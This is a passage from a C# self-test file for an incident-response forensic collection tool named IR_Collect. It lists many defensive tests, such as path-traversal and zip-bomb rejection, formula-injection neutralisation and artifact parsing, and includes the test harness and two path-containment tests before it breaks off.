#if INCLUDE_TESTS
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using IR_Collect.Analysis;
using IR_Collect.Analysis.Correlation;
using IR_Collect.Analysis.Correlation.Normalizers;
using IR_Collect.Collectors;
using IR_Collect.Utils;

namespace IR_Collect.Tests
{
    /// <summary>Headless self-tests for review builds (-test). Same assembly as production code.</summary>
    public static class IRCollectSelfTests
    {
        public static int RunAndWriteResultFile()
        {
            var sb = new StringBuilder();
            int failed = 0;
            failed += RunOne("IsPathUnderRoot_accepts_child", IsPathUnderRoot_accepts_child, sb) ? 0 : 1;
            failed += RunOne("IsPathUnderRoot_rejects_prefix_sibling", IsPathUnderRoot_rejects_prefix_sibling, sb) ? 0 : 1;
            failed += RunOne("ExtractZip_rejects_traversal_only", ExtractZip_rejects_traversal_only, sb) ? 0 : 1;
            failed += RunOne("ExtractZip_accepts_plain_entry", ExtractZip_accepts_plain_entry, sb) ? 0 : 1;
            failed += RunOne("ArchiveIntake_zip_maps_windows_invalid_name", ArchiveIntake_zip_maps_windows_invalid_name, sb) ? 0 : 1;
            failed += RunOne("ArchiveIntake_tar_pax_preserves_unicode_path", ArchiveIntake_tar_pax_preserves_unicode_path, sb) ? 0 : 1;
            failed += RunOne("ArchiveIntake_rejects_zip_expansion_bomb_without_partial_output", ArchiveIntake_rejects_zip_expansion_bomb_without_partial_output, sb) ? 0 : 1;
            failed += RunOne("ArchiveIntake_rejects_targz_expansion_bomb_without_partial_output", ArchiveIntake_rejects_targz_expansion_bomb_without_partial_output, sb) ? 0 : 1;
            failed += RunOne("ArchiveIntake_rejects_low_disk_without_partial_output", ArchiveIntake_rejects_low_disk_without_partial_output, sb) ? 0 : 1;
            failed += RunOne("ArchiveIntake_cancellation_leaves_no_partial_output", ArchiveIntake_cancellation_leaves_no_partial_output, sb) ? 0 : 1;
            failed += RunOne("EventLogLabel_strips_suffix_case_insensitive", EventLogLabel_strips_suffix_case_insensitive, sb) ? 0 : 1;
            failed += RunOne("EventLogLabel_keeps_non_suffix_name", EventLogLabel_keeps_non_suffix_name, sb) ? 0 : 1;
            failed += RunOne("CaseManager_GetRelativePath_accepts_child", CaseManager_GetRelativePath_accepts_child, sb) ? 0 : 1;
            failed += RunOne("CaseManager_GetRelativePath_rejects_prefix_sibling", CaseManager_GetRelativePath_rejects_prefix_sibling, sb) ? 0 : 1;
            failed += RunOne("Cli_unknown_arg_exits_nonzero", Cli_unknown_arg_exits_nonzero, sb) ? 0 : 1;
            failed += RunOne("EscapeArgForCmd_quotes_metachars_without_caret_corruption", EscapeArgForCmd_quotes_metachars_without_caret_corruption, sb) ? 0 : 1;
            failed += RunOne("FactStoreLoad_skips_bad_rows_keeps_good", FactStoreLoad_skips_bad_rows_keeps_good, sb) ? 0 : 1;
            failed += RunOne("FactStoreLoad_unsupported_schema_throws", FactStoreLoad_unsupported_schema_throws, sb) ? 0 : 1;
            failed += RunOne("FactStoreLoad_all_unreadable_rows_throws", FactStoreLoad_all_unreadable_rows_throws, sb) ? 0 : 1;
            failed += RunOne("FactTime_ToComparableUtc_aligns_local_and_utc_same_instant", FactTime_ToComparableUtc_aligns_local_and_utc_same_instant, sb) ? 0 : 1;
            failed += RunOne("FactStore_GetByTimeRange_matches_mixed_kind_same_instant", FactStore_GetByTimeRange_matches_mixed_kind_same_instant, sb) ? 0 : 1;
            failed += RunOne("FactStore_AppendFacts_swaps_without_mutating_old_reference", FactStore_AppendFacts_swaps_without_mutating_old_reference, sb) ? 0 : 1;
            failed += RunOne("FactStore_concurrent_append_and_read_no_exception", FactStore_concurrent_append_and_read_no_exception, sb) ? 0 : 1;
            failed += RunOne("SqliteModule_unsigned_or_missing_dll_is_rejected", SqliteModule_unsigned_or_missing_dll_is_rejected, sb) ? 0 : 1;
            failed += RunOne("ConfigAcl_hardening_keeps_file_readable_and_no_throw", ConfigAcl_hardening_keeps_file_readable_and_no_throw, sb) ? 0 : 1;
            failed += RunOne("CsvExport_neutralizes_formula_injection", CsvExport_neutralizes_formula_injection, sb) ? 0 : 1;
            failed += RunOne("AtomicFile_failure_preserves_published_output_and_cleans_staging", AtomicFile_failure_preserves_published_output_and_cleans_staging, sb) ? 0 : 1;
            failed += RunOne("Collector_output_collision_preserves_existing_evidence", Collector_output_collision_preserves_existing_evidence, sb) ? 0 : 1;
            failed += RunOne("EvidenceManifest_rejects_reparse_attributes", EvidenceManifest_rejects_reparse_attributes, sb) ? 0 : 1;
            failed += RunOne("EvidenceManifest_missing_root_is_incomplete", EvidenceManifest_missing_root_is_incomplete, sb) ? 0 : 1;
            failed += RunOne("RunToFile_streams_output_and_cleans_on_failure", RunToFile_streams_output_and_cleans_on_failure, sb) ? 0 : 1;
            failed += RunOne("MemoryRecord_args_governance_note_round_trips", MemoryRecord_args_governance_note_round_trips, sb) ? 0 : 1;
            failed += RunOne("Lnk_parser_reads_unicode_and_ansi_local_base_path", Lnk_parser_reads_unicode_and_ansi_local_base_path, sb) ? 0 : 1;
            failed += RunOne("MftRunList_parses_valid_and_survives_truncation", MftRunList_parses_valid_and_survives_truncation, sb) ? 0 : 1;
            failed += RunOne("MftNormalizer_action_reflects_timestamp_source", MftNormalizer_action_reflects_timestamp_source, sb) ? 0 : 1;
            failed += RunOne("MftFixup_restores_bytes_at_sector_boundaries", MftFixup_restores_bytes_at_sector_boundaries, sb) ? 0 : 1;
            failed += RunOne("MftParser_prefers_win32_long_name_over_dos_short_name", MftParser_prefers_win32_long_name_over_dos_short_name, sb) ? 0 : 1;
            failed += RunOne("MftParser_follows_resident_attribute_list_file_name_extension", MftParser_follows_resident_attribute_list_file_name_extension, sb) ? 0 : 1;
            failed += RunOne("ShimCache_structured_win10_entry_recovers_path_and_filetime", ShimCache_structured_win10_entry_recovers_path_and_filetime, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_ingests_artifacts_and_builds_summary", AnalyzeFolder_ingests_artifacts_and_builds_summary, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_readonly_workspace_rejects_forged_canonical_and_stabilizes_digest", AnalyzeFolder_readonly_workspace_rejects_forged_canonical_and_stabilizes_digest, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_source_change_is_rejected_before_fact_build", AnalyzeFolder_source_change_is_rejected_before_fact_build, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_missing_source_is_rejected_before_fact_build", AnalyzeFolder_missing_source_is_rejected_before_fact_build, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_preexisting_fact_store_is_not_trusted", AnalyzeFolder_preexisting_fact_store_is_not_trusted, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_preexisting_fact_store_is_not_trusted", AnalyzeFolder_uac_preexisting_fact_store_is_not_trusted, sb) ? 0 : 1;
            failed += RunOne("AnalyzeArchive_preexisting_fact_store_is_not_trusted", AnalyzeArchive_preexisting_fact_store_is_not_trusted, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_process_snapshot_derives_canonical_process_csv", AnalyzeFolder_uac_process_snapshot_derives_canonical_process_csv, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_bodyfile_derives_activity_timeline", AnalyzeFolder_uac_bodyfile_derives_activity_timeline, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_auth_log_derives_structured_auth_facts", AnalyzeFolder_uac_auth_log_derives_structured_auth_facts, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_network_snapshot_derives_network_connection_facts", AnalyzeFolder_uac_network_snapshot_derives_network_connection_facts, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_persistence_derives_linux_macos_facts", AnalyzeFolder_uac_persistence_derives_linux_macos_facts, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_journal_derives_header_and_boot_facts", AnalyzeFolder_uac_journal_derives_header_and_boot_facts, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_login_outputs_derive_facts_without_inventing_utc", AnalyzeFolder_uac_login_outputs_derive_facts_without_inventing_utc, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_auditd_groups_compound_events_and_decodes_commands", AnalyzeFolder_uac_auditd_groups_compound_events_and_decodes_commands, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_system_logs_parse_rfc_formats_without_inventing_time", AnalyzeFolder_uac_system_logs_parse_rfc_formats_without_inventing_time, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_packages_normalize_inventory_and_time_semantics", AnalyzeFolder_uac_packages_normalize_inventory_and_time_semantics, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_file_hashes_normalize_multi_platform_formats", AnalyzeFolder_uac_file_hashes_normalize_multi_platform_formats, sb) ? 0 : 1;
            failed += RunOne("AnalyzeFolder_uac_web_logs_parse_access_error_gzip_and_time_semantics", AnalyzeFolder_uac_web_logs_parse_access_error_gzip_and_time_semantics, sb) ? 0 : 1;
            failed += RunOne("AnalyzeArchive_uac_tar_gz_ingests_complete_evidence", AnalyzeArchive_uac_tar_gz_ingests_complete_evidence, sb) ? 0 : 1;
            failed += RunOne("ArchiveIntake_rejects_tar_path_traversal", ArchiveIntake_rejects_tar_path_traversal, sb) ? 0 : 1;
            failed += RunOne("RawArtifactCsvWriter_amcache_output_is_consumable_by_normalizer", RawArtifactCsvWriter_amcache_output_is_consumable_by_normalizer, sb) ? 0 : 1;
            failed += RunOne("DiffBuilder_detects_added_modified_and_reverse_removed_facts", DiffBuilder_detects_added_modified_and_reverse_removed_facts, sb) ? 0 : 1;
            failed += RunOne("DiffTab_builds_grid_from_loaded_ready_baseline", DiffTab_builds_grid_from_loaded_ready_baseline, sb) ? 0 : 1;
            failed += RunOne("DiffCli_compares_readonly_folders_and_writes_diff_v1", DiffCli_compares_readonly_folders_and_writes_diff_v1, sb) ? 0 : 1;
            failed += RunOne("FactStoreBuildCache_reuses_unchanged_case", FactStoreBuildCache_reuses_unchanged_case, sb) ? 0 : 1;
            failed += RunOne("FactStoreBuildCache_reuses_normalization_warnings", FactStoreBuildCache_reuses_normalization_warnings, sb) ? 0 : 1;
            failed += RunOne("FactStoreBuildCache_rebuilds_only_changed_eventlog", FactStoreBuildCache_rebuilds_only_changed_eventlog, sb) ? 0 : 1;
            failed += RunOne("FactStoreBuildCache_non_event_change_falls_back_full", FactStoreBuildCache_non_event_change_falls_back_full, sb) ? 0 : 1;
            failed += RunOne("FactStoreBuildCache_corrupt_cache_falls_back_full", FactStoreBuildCache_corrupt_cache_falls_back_full, sb) ? 0 : 1;
            failed += RunOne("CorrelationCsvHelper_large_file_records_load_warning", CorrelationCsvHelper_large_file_records_load_warning, sb) ? 0 : 1;
            failed += RunOne("CorrelationCsvHelper_row_limit_boundary_is_stable", CorrelationCsvHelper_row_limit_boundary_is_stable, sb) ? 0 : 1;
            failed += RunOne("FactStoreAutoBuild_rebuilds_stale_store", FactStoreAutoBuild_rebuilds_stale_store, sb) ? 0 : 1;
            failed += RunOne("CorrelateCli_finds_shared_entity_across_two_folders", CorrelateCli_finds_shared_entity_across_two_folders, sb) ? 0 : 1;
            failed += RunOne("BuildInfo_version_matches_assembly_and_is_stamped_in_outputs", BuildInfo_version_matches_assembly_and_is_stamped_in_outputs, sb) ? 0 : 1;
            failed += RunOne("EvidenceManifest_hashes_inputs_and_summary_carries_digest", EvidenceManifest_hashes_inputs_and_summary_carries_digest, sb) ? 0 : 1;
            failed += RunOne("RecentFileScan_respects_time_budget", RecentFileScan_respects_time_budget, sb) ? 0 : 1;
            failed += RunOne("Prefetch_parses_v30_and_normalizer_emits_executed_facts", Prefetch_parses_v30_and_normalizer_emits_executed_facts, sb) ? 0 : 1;
            failed += RunOne("Prefetch_handles_v23_and_malformed_inputs", Prefetch_handles_v23_and_malformed_inputs, sb) ? 0 : 1;
            failed += RunOne("GuidedHunt_flags_prefetch_dll_sideload", GuidedHunt_flags_prefetch_dll_sideload, sb) ? 0 : 1;
            failed += RunOne("GuidedHunt_flags_execution_from_suspicious_path", GuidedHunt_flags_execution_from_suspicious_path, sb) ? 0 : 1;
            failed += RunOne("GuidedHunt_flags_event_log_cleared", GuidedHunt_flags_event_log_cleared, sb) ? 0 : 1;
            failed += RunOne("OutputSchemas_required_fields_present_in_generated_json", OutputSchemas_required_fields_present_in_generated_json, sb) ? 0 : 1;
            failed += RunOne("GuidedHunt_demo_case_trips_expected_rules", GuidedHunt_demo_case_trips_expected_rules, sb) ? 0 : 1;
            failed += RunOne("GraphCli_multi_hop_reaches_sibling_via_shared_publisher", GraphCli_multi_hop_reaches_sibling_via_shared_publisher, sb) ? 0 : 1;
            failed += RunOne("EventLog_5145_composes_absolute_path_from_share_local_path", EventLog_5145_composes_absolute_path_from_share_local_path, sb) ? 0 : 1;
            failed += RunOne("SrumDecodeIdBlob_distinguishes_sid_from_utf16_text", SrumDecodeIdBlob_distinguishes_sid_from_utf16_text, sb) ? 0 : 1;
            failed += RunOne("EventLog_1149_message_fallback_adds_target_user", EventLog_1149_message_fallback_adds_target_user, sb) ? 0 : 1;
            failed += RunOne("EventLog_1149_structured_target_user_is_not_duplicated", EventLog_1149_structured_target_user_is_not_duplicated, sb) ? 0 : 1;
            failed += RunOne("EventLog_5145_relative_target_name_maps_to_path", EventLog_5145_relative_target_name_maps_to_path, sb) ? 0 : 1;
            failed += RunOne("EventLog_blank_time_keeps_fact_with_entities_low_confidence", EventLog_blank_time_keeps_fact_with_entities_low_confidence, sb) ? 0 : 1;
            failed += RunOne("MemoryHandoff_resolve_acquire_and_analyze_arg_templates", MemoryHandoff_resolve_acquire_and_analyze_arg_templates, sb) ? 0 : 1;
            failed += RunOne("MemoryHandoff_finalize_analysis_disk_reconciles_missing_outputs", MemoryHandoff_finalize_analysis_disk_reconciles_missing_outputs, sb) ? 0 : 1;
            failed += RunOne("MemoryCoverage_complete_with_missing_dump_becomes_failed", MemoryCoverage_complete_with_missing_dump_becomes_failed, sb) ? 0 : 1;
            failed += RunOne("MemoryCoverage_partial_with_missing_dump_stays_partial", MemoryCoverage_partial_with_missing_dump_stays_partial, sb) ? 0 : 1;
            failed += RunOne("MemoryAnalysisOutputDir_default_folder_allowed", MemoryAnalysisOutputDir_default_folder_allowed, sb) ? 0 : 1;
            failed += RunOne("MemoryAnalysisOutputDir_case_root_rejected", MemoryAnalysisOutputDir_case_root_rejected, sb) ? 0 : 1;
            failed += RunOne("MemoryAnalysisOutputDir_reserved_evidence_dir_rejected", MemoryAnalysisOutputDir_reserved_evidence_dir_rejected, sb) ? 0 : 1;
            failed += RunOne("MemoryAnalysisCoverage_complete_with_outputs_is_complete", MemoryAnalysisCoverage_complete_with_outputs_is_complete, sb) ? 0 : 1;
            failed += RunOne("MemoryAnalysisCoverage_complete_without_outputs_becomes_failed", MemoryAnalysisCoverage_complete_without_outputs_becomes_failed, sb) ? 0 : 1;
            failed += RunOne("MemoryAcquisitionNormalizer_ToFacts_emits_summary_and_output_facts", MemoryAcquisitionNormalizer_ToFacts_emits_summary_and_output_facts, sb) ? 0 : 1;
            failed += RunOne("MemoryAnalysisNormalizer_ToFacts_emits_summary_and_output_facts", MemoryAnalysisNormalizer_ToFacts_emits_summary_and_output_facts, sb) ? 0 : 1;
            failed += RunOne("ServiceNormalizer_ToFacts_maps_service_name_and_path", ServiceNormalizer_ToFacts_maps_service_name_and_path, sb) ? 0 : 1;
            failed += RunOne("StoredCredentialNormalizer_ToFacts_maps_target_user_server", StoredCredentialNormalizer_ToFacts_maps_target_user_server, sb) ? 0 : 1;
            failed += RunOne("KerberosTicketCacheNormalizer_ToFacts_maps_ticket_entities_and_time", KerberosTicketCacheNormalizer_ToFacts_maps_ticket_entities_and_time, sb) ? 0 : 1;
            failed += RunOne("EventLogCoverage_label_mismatch_is_partial", EventLogCoverage_label_mismatch_is_partial, sb) ? 0 : 1;
            failed += RunOne("ExecutionArtifactsCoverage_failed_with_present_artifact_stays_failed", ExecutionArtifactsCoverage_failed_with_present_artifact_stays_failed, sb) ? 0 : 1;
            failed += RunOne("CollectionCoverage_failed_step_with_present_artifact_makes_overall_failed", CollectionCoverage_failed_step_with_present_artifact_makes_overall_failed, sb) ? 0 : 1;
            failed += RunOne("CollectionCoverage_missing_steps_make_overall_partial", CollectionCoverage_missing_steps_make_overall_partial, sb) ? 0 : 1;
            failed += RunOne("CollectionResult_coverage_failed_step_sets_has_errors", CollectionResult_coverage_failed_step_sets_has_errors, sb) ? 0 : 1;
            failed += RunOne("SharedEntityPivot_finds_cross_host_path", SharedEntityPivot_finds_cross_host_path, sb) ? 0 : 1;
            failed += RunOne("RelatedEntityPivot_returns_seed_neighbors", RelatedEntityPivot_returns_seed_neighbors, sb) ? 0 : 1;
            failed += RunOne("InvestigationGraph_returns_related_edges", InvestigationGraph_returns_related_edges, sb) ? 0 : 1;
            failed += RunOne("TemporalSharedEntityPivot_groups_same_bucket_across_hosts", TemporalSharedEntityPivot_groups_same_bucket_across_hosts, sb) ? 0 : 1;
            failed += RunOne("SummaryExport_serialize_preserves_summary_v3_schema", SummaryExport_serialize_preserves_summary_v3_schema, sb) ? 0 : 1;
            failed += RunOne("SummaryExport_serialize_handles_minvalue_fact_time", SummaryExport_serialize_handles_minvalue_fact_time, sb) ? 0 : 1;
            failed += RunOne("ParserNoteSummary_includes_non_amcache_sources", ParserNoteSummary_includes_non_amcache_sources, sb) ? 0 : 1;
            failed += RunOne("SummaryTab_includes_parser_notes_section", SummaryTab_includes_parser_notes_section, sb) ? 0 : 1;
            failed += RunOne("Summary_and_html_include_forensic_policy_metadata", Summary_and_html_include_forensic_policy_metadata, sb) ? 0 : 1;
            failed += RunOne("HtmlReport_missing_artifact_counts_render_not_found", HtmlReport_missing_artifact_counts_render_not_found, sb) ? 0 : 1;
            failed += RunOne("SummaryPayload_missing_artifact_counts_are_zero", SummaryPayload_missing_artifact_counts_are_zero, sb) ? 0 : 1;
            failed += RunOne("ShellBagsParser_DecodeShellItemBlob_ascii_segment", ShellBagsParser_DecodeShellItemBlob_ascii_segment, sb) ? 0 : 1;
            failed += RunOne("ShellBagsParser_TryEnsureShellBagsCsv_writes_csv", ShellBagsParser_TryEnsureShellBagsCsv_writes_csv, sb) ? 0 : 1;
            failed += RunOne("ShellBags_ReadLogicalLines_hex_continuation_strips_backslashes", ShellBags_ReadLogicalLines_hex_continuation_strips_backslashes, sb) ? 0 : 1;
            failed += RunOne("ShellBagsParser_TryEnsureShellBagsCsv_multiline_hex_decodes_path", ShellBagsParser_TryEnsureShellBagsCsv_multiline_hex_decodes_path, sb) ? 0 : 1;
            failed += RunOne("ShellBagsParser_BagsShell_key_without_Shell_segment", ShellBagsParser_BagsShell_key_without_Shell_segment, sb) ? 0 : 1;
            failed += RunOne("ShellBagsParser_BagsShellNoRoam_key", ShellBagsParser_BagsShellNoRoam_key, sb) ? 0 : 1;
            failed += RunOne("ShellBagsNormalizer_ToFacts_maps_path_user_sid", ShellBagsNormalizer_ToFacts_maps_path_user_sid, sb) ? 0 : 1;
            failed += RunOne("JumpListNormalizer_ToFacts_emits_entities", JumpListNormalizer_ToFacts_emits_entities, sb) ? 0 : 1;
            failed += RunOne("JumpListNormalizer_ToFacts_unc_derives_workstation_share", JumpListNormalizer_ToFacts_unc_derives_workstation_share, sb) ? 0 : 1;
            failed += RunOne("BitsJobNormalizer_ToFacts_unc_derives_share_and_remote_ip", BitsJobNormalizer_ToFacts_unc_derives_share_and_remote_ip, sb) ? 0 : 1;
            failed += RunOne("BitsJobNormalizer_ToFacts_multi_segment_remote_name_derives_unc_and_urls", BitsJobNormalizer_ToFacts_multi_segment_remote_name_derives_unc_and_urls, sb) ? 0 : 1;
            failed += RunOne("LogonSessionNormalizer_ToFacts_maps_user_sid_and_logon_metadata", LogonSessionNormalizer_ToFacts_maps_user_sid_and_logon_metadata, sb) ? 0 : 1;
            failed += RunOne("NetworkResourceNormalizer_ToFacts_derives_unc_entities", NetworkResourceNormalizer_ToFacts_derives_unc_entities, sb) ? 0 : 1;
            failed += RunOne("ServerConnectionNormalizer_ToFacts_maps_user_share_and_remote_host", ServerConnectionNormalizer_ToFacts_maps_user_share_and_remote_host, sb) ? 0 : 1;
            failed += RunOne("FactProvenance_logon_session_uses_system_info_step", FactProvenance_logon_session_uses_system_info_step, sb) ? 0 : 1;
            failed += RunOne("FactProvenance_bits_uses_execution_artifacts_step", FactProvenance_bits_uses_execution_artifacts_step, sb) ? 0 : 1;
            failed += RunOne("FactProvenance_wmi_uses_execution_artifacts_step", FactProvenance_wmi_uses_execution_artifacts_step, sb) ? 0 : 1;
            failed += RunOne("FactProvenance_service_uses_persistence_step", FactProvenance_service_uses_persistence_step, sb) ? 0 : 1;
            failed += RunOne("FactProvenance_stored_credential_uses_system_info_step", FactProvenance_stored_credential_uses_system_info_step, sb) ? 0 : 1;
            failed += RunOne("FactProvenance_kerberos_ticket_uses_system_info_step", FactProvenance_kerberos_ticket_uses_system_info_step, sb) ? 0 : 1;
            failed += RunOne("FactProvenance_memory_acquisition_uses_memory_acquisition_step", FactProvenance_memory_acquisition_uses_memory_acquisition_step, sb) ? 0 : 1;
            failed += RunOne("FactProvenance_memory_analysis_uses_memory_analysis_step", FactProvenance_memory_analysis_uses_memory_analysis_step, sb) ? 0 : 1;
            failed += RunOne("Timeline_unified_jumplist_row_count_equals_activity_only_not_jump_csv_dup", Timeline_unified_jumplist_row_count_equals_activity_only_not_jump_csv_dup, sb) ? 0 : 1;
            failed += RunOne("BuildTimelineEvents_MainForm_path_jumplist_single_when_activity_and_jump_csv_present", BuildTimelineEvents_MainForm_path_jumplist_single_when_activity_and_jump_csv_present, sb) ? 0 : 1;
            failed += RunOne("TimelineFilter_helpers_honor_minute_precision", TimelineFilter_helpers_honor_minute_precision, sb) ? 0 : 1;
            failed += RunOne("TimelineGraphFocus_matches_entity_refs_before_text_fallback", TimelineGraphFocus_matches_entity_refs_before_text_fallback, sb) ? 0 : 1;
            failed += RunOne("FullLogExportJson_includes_memory_and_freshness_host_fields", FullLogExportJson_includes_memory_and_freshness_host_fields, sb) ? 0 : 1;
            failed += RunOne("GuidedHuntPack_matches_rdp_and_admin_share_rules", GuidedHuntPack_matches_rdp_and_admin_share_rules, sb) ? 0 : 1;
            failed += RunOne("GuidedHuntPack_matches_task_service_and_credential_rules", GuidedHuntPack_matches_task_service_and_credential_rules, sb) ? 0 : 1;
            failed += RunOne("GuidedHuntPack_matches_cmdkey_and_klist_artifacts", GuidedHuntPack_matches_cmdkey_and_klist_artifacts, sb) ? 0 : 1;
            failed += RunOne("SummaryExport_serialize_includes_guided_hunt", SummaryExport_serialize_includes_guided_hunt, sb) ? 0 : 1;
            failed += RunOne("EndpointGovernance_empty_allowlist_blocks", EndpointGovernance_empty_allowlist_blocks, sb) ? 0 : 1;
            failed += RunOne("EndpointGovernance_prefix_allows_child_path", EndpointGovernance_prefix_allows_child_path, sb) ? 0 : 1;
            failed += RunOne("EndpointGovernance_different_host_rejected", EndpointGovernance_different_host_rejected, sb) ? 0 : 1;
            failed += RunOne("EndpointGovernance_path_case_mismatch_rejected", EndpointGovernance_path_case_mismatch_rejected, sb) ? 0 : 1;
            failed += RunOne("CollectionModeProfile_normalize_and_cases", CollectionModeProfile_normalize_and_cases, sb) ? 0 : 1;
            failed += RunOne("CollectionModeProfile_forensic_strict_blocks_outbound_helpers", CollectionModeProfile_forensic_strict_blocks_outbound_helpers, sb) ? 0 : 1;
            failed += RunOne("CollectionModeProfile_standard_allows_outbound_helpers", CollectionModeProfile_standard_allows_outbound_helpers, sb) ? 0 : 1;
            failed += RunOne("CollectionCoverage_report_includes_mode_profile", CollectionCoverage_report_includes_mode_profile, sb) ? 0 : 1;
            failed += RunOne("CollectionImpactPolicy_classifies_system_network_and_unknown_targets", CollectionImpactPolicy_classifies_system_network_and_unknown_targets, sb) ? 0 : 1;
            failed += RunOne("CollectionImpactPolicy_strict_restricts_enabled_high_impact_steps", CollectionImpactPolicy_strict_restricts_enabled_high_impact_steps, sb) ? 0 : 1;
            failed += RunOne("CollectionImpactPolicy_standard_does_not_restrict_steps", CollectionImpactPolicy_standard_does_not_restrict_steps, sb) ? 0 : 1;
            failed += RunOne("Collector_forensic_strict_without_acknowledgment_is_rejected_before_collection", Collector_forensic_strict_without_acknowledgment_is_rejected_before_collection, sb) ? 0 : 1;
            failed += RunOne("CollectionCoverage_forensic_policy_metadata_round_trips_and_marks_partial", CollectionCoverage_forensic_policy_metadata_round_trips_and_marks_partial, sb) ? 0 : 1;
            failed += RunOne("MemoryCollectors_run_policy_writes_skipped_sidecars_without_tools", MemoryCollectors_run_policy_writes_skipped_sidecars_without_tools, sb) ? 0 : 1;
            failed += RunOne("CollectionResult_profile_skip_sets_coverage_gap", CollectionResult_profile_skip_sets_coverage_gap, sb) ? 0 : 1;
            failed += RunOne("CollectionExitCode_distinguishes_errors_gaps_and_success", CollectionExitCode_distinguishes_errors_gaps_and_success, sb) ? 0 : 1;
            failed += RunOne("AnalysisClis_output_failure_returns_nonzero", AnalysisClis_output_failure_returns_nonzero, sb) ? 0 : 1;
            failed += RunOne("ZipUpload_gate_uses_run_profile_ForensicStrict_even_if_settings_Standard", ZipUpload_gate_uses_run_profile_ForensicStrict_even_if_settings_Standard, sb) ? 0 : 1;
            failed += RunOne("ZipUpload_gate_run_Standard_not_blocked_when_settings_ForensicStrict", ZipUpload_gate_run_Standard_not_blocked_when_settings_ForensicStrict, sb) ? 0 : 1;
            failed += RunOne("ZipUpload_gate_null_run_falls_back_to_settings_ForensicStrict", ZipUpload_gate_null_run_falls_back_to_settings_ForensicStrict, sb) ? 0 : 1;
            failed += RunOne("Dashboard_loaded_case_profiles_line_mixed", Dashboard_loaded_case_profiles_line_mixed, sb) ? 0 : 1;
            failed += RunOne("Dashboard_loaded_case_profiles_line_all_unlabeled", Dashboard_loaded_case_profiles_line_all_unlabeled, sb) ? 0 : 1;
            failed += RunOne("Dashboard_loaded_case_profiles_line_single", Dashboard_loaded_case_profiles_line_single, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_basic_masks_collection_coverage_identity", AiRedaction_basic_masks_collection_coverage_identity, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_basic_masks_memory_toolargs_paths", AiRedaction_basic_masks_memory_toolargs_paths, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_basic_masks_top_level_host_case_id", AiRedaction_basic_masks_top_level_host_case_id, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_basic_masks_memory_collector_user", AiRedaction_basic_masks_memory_collector_user, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_basic_masks_fact_details_unc_paths_live_untouched", AiRedaction_basic_masks_fact_details_unc_paths_live_untouched, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_basic_masks_workflow_notes_paths_live_untouched", AiRedaction_basic_masks_workflow_notes_paths_live_untouched, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_basic_masks_fact_store_inputs_live_untouched", AiRedaction_basic_masks_fact_store_inputs_live_untouched, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_strict_clears_fact_samples", AiRedaction_strict_clears_fact_samples, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_basic_masks_ipv4_in_highlights", AiRedaction_basic_masks_ipv4_in_highlights, sb) ? 0 : 1;
            failed += RunOne("AiRedaction_none_unchanged_highlight", AiRedaction_none_unchanged_highlight, sb) ? 0 : 1;
            failed += RunOne("FixtureCorpus_committed_files_match_builder_and_parse_as_expected", FixtureCorpus_committed_files_match_builder_and_parse_as_expected, sb) ? 0 : 1;

            int cleanupFailures = CaseManager.CleanupAll();
            if (cleanupFailures > 0)
                sb.AppendLine("WARN: " + cleanupFailures.ToString(CultureInfo.InvariantCulture) +
                    " analysis workspace cleanup operation(s) failed.");

            sb.AppendLine();
            sb.AppendLine(failed == 0 ? "SUMMARY: 0 failed (all passed)." : "SUMMARY: " + failed + " failed.");

            string outPath = Path.Combine(Path.GetTempPath(), BuildInfo.SelfTestResultFileName);
            try
            {
                File.WriteAllText(outPath, sb.ToString(), new UTF8Encoding(false));
            }
            catch (Exception ex)
            {
                sb.AppendLine("WARN: could not write result file: " + ex.Message);
            }

            Console.Write(sb.ToString());
            return failed > 0 ? 1 : 0;
        }

        private static bool RunOne(string name, Func<bool> test, StringBuilder sb)
        {
            try
            {
                if (test())
                {
                    sb.AppendLine("PASS: " + name);
                    return true;
                }
                sb.AppendLine("FAIL: " + name + " (returned false)");
                return false;
            }
            catch (Exception ex)
            {
                sb.AppendLine("FAIL: " + name + " — " + ex.Message);
                return false;
            }
        }

        private static bool IsPathUnderRoot_accepts_child()
        {
            string root = Path.Combine(Path.GetTempPath(), "IRCollectPathTest_" + Guid.NewGuid().ToString("N"));
            try
            {
                string child = Path.Combine(root, "sub", "f.txt");
                Directory.CreateDirectory(Path.GetDirectoryName(child));
                File.WriteAllText(child, "x");
                return CaseManager.IsPathUnderRoot(child, root);
            }
            finally
            {
                TryDeleteDir(root);
            }
        }

        private static bool IsPathUnderRoot_rejects_prefix_sibling()
        {
            string root = Path.Combine(Path.GetTempPath(), "IRCollectPathTestA_" + Guid.NewGuid().ToString("N"));
            string sibling = root + "_X";
            try
            {
                Directory.CreateDirectory(root);
                Directory.CreateDirectory(sibling);
                string file = Path.Combine(sibling, "f.txt");
                File.WriteAllText(file, "x");
                return !CaseManager.IsPathUnderRoot(file, root);
            }
            finally
            {
                TryDeleteDir(root);
                TryDeleteDir(sibling);
            }
        }

        private static bool ExtractZip_rejects_traversal_only()
        {
